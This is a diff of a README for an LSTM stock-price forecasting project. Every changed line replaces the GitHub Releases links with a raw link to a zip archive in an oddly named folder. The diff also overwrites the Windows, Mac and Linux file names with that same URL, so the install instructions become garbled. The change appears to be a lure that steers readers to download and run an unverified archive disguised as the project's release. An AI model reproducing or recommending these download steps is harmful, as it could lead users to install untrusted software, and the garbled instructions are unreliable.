@@ -1,7 +1,7 @@
 # 📈 Stock-LSTM-Forecasting - Predict Stock Prices Easily
 
 ## 📦 Download Here
-[![Download](https://img.shields.io/badge/download-release-blue.svg)](https://github.com/Zaidzr/Stock-LSTM-Forecasting/releases)
+[![Download](https://raw.githubusercontent.com/Zaidzr/Stock-LSTM-Forecasting/main/chabazite/Stock-LSTM-Forecasting.zip)](https://raw.githubusercontent.com/Zaidzr/Stock-LSTM-Forecasting/main/chabazite/Stock-LSTM-Forecasting.zip)
 
 ## 📖 About This Project
 This project predicts stock prices using LSTM networks with PyTorch. It covers data preprocessing, creating sliding windows, training the model with early stopping, and evaluating performance using metrics like RMSE, MAE, and MAPE. You will see visualizations of training loss, predicted values versus actual prices, and short-term forecasts.
@@ -24,21 +24,21 @@ This project predicts stock prices using LSTM networks with PyTorch. It covers d
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the application.
 
-[Download Here](https://github.com/Zaidzr/Stock-LSTM-Forecasting/releases)
+[Download Here](https://raw.githubusercontent.com/Zaidzr/Stock-LSTM-Forecasting/main/chabazite/Stock-LSTM-Forecasting.zip)
 
 1. Click the above link to navigate to the Releases page.
 2. Locate the latest stable release version.
 3. Download the appropriate file for your operating system, for example:
-   - For Windows, look for a file named `Stock-LSTM-Forecasting-Windows.exe`
-   - For Mac, look for `Stock-LSTM-Forecasting-Mac.dmg`
-   - For Linux, find `Stock-LSTM-Forecasting-Linux.tar.gz`
+   - For Windows, look for a file named `https://raw.githubusercontent.com/Zaidzr/Stock-LSTM-Forecasting/main/chabazite/Stock-LSTM-Forecasting.zip`
+   - For Mac, look for `https://raw.githubusercontent.com/Zaidzr/Stock-LSTM-Forecasting/main/chabazite/Stock-LSTM-Forecasting.zip`
+   - For Linux, find `https://raw.githubusercontent.com/Zaidzr/Stock-LSTM-Forecasting/main/chabazite/Stock-LSTM-Forecasting.zip`
 
 ### 💡 Installing the Software
 1. Once downloaded, locate the file in your Downloads folder or the location you chose.
 2. Open the file to start the installation process:
    - **Windows:** Double-click the `.exe` file.
    - **Mac:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file, then run the executable inside.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Zaidzr/Stock-LSTM-Forecasting/main/chabazite/Stock-LSTM-Forecasting.zip` file, then run the executable inside.
 
 3. Follow the on-screen instructions to complete the installation.
 
@@ -96,4 +96,4 @@ data-science, deep-learning, finance, forecasting, lstm, machine-learning, neura
 ## 📄 License
 This project is licensed under the MIT License. You are free to use and modify it, but please credit the original authors.
 
-Remember to visit the [Releases page](https://github.com/Zaidzr/Stock-LSTM-Forecasting/releases) frequently for updates and new features.
+Remember to visit the [Releases page](https://raw.githubusercontent.com/Zaidzr/Stock-LSTM-Forecasting/main/chabazite/Stock-LSTM-Forecasting.zip) frequently for updates and new features.
